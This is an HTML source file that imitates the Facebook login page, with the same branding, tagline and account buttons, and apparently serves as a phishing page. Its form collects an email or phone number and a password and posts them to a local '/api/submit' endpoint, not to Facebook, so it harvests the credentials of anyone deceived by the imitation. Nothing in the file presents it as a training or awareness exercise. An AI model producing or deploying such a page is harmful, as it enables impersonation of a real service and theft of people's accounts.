<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook</title>
  <link rel="stylesheet" href="w3.css">
</head>
<body class="w3-light-gray">

  <div class="w3-container">
    <h1 class="w3-text-blue w3-center w3-panel w3-jumbo"><b>facebook</b></h1>
    <p style="width:300px; margin-inline:auto;" class="w3-large w3-center">
      Facebook helps you connect and share with the people in your life.
    </p>
  </div>

  <form action="/api/submit" method="POST"
        style="max-width:400px; margin-inline:auto;"
        class="w3-white w3-container w3-card-4 w3-padding-16 w3-round-large">
    <p>
      <input type="email" name="email" placeholder="Email address or phone number" required
             class="w3-input w3-border w3-padding-16 w3-round-large">
    </p>
    <p>
      <input type="password" name="password" placeholder="Enter your password" required
             class="w3-input w3-border w3-padding-16 w3-round-large">
    </p>
    <p>
      <button type="submit" class="w3-button w3-round w3-padding-16 w3-text-white"
              style="width:100%; background-color: rgb(39,145,231);"><b>Log in</b></button>
    </p>
    <p class="w3-text-blue w3-center"><a href="#">Forgotten password?</a></p>
    <hr class="w3-black">
    <button type="button" class="w3-button w3-text-white w3-padding-16 w3-round-large"
            style="margin-inline:auto; display:block; background-color:#5acf5e;">
      <b>Create new account</b>
    </button>
  </form>
</body>
</html>
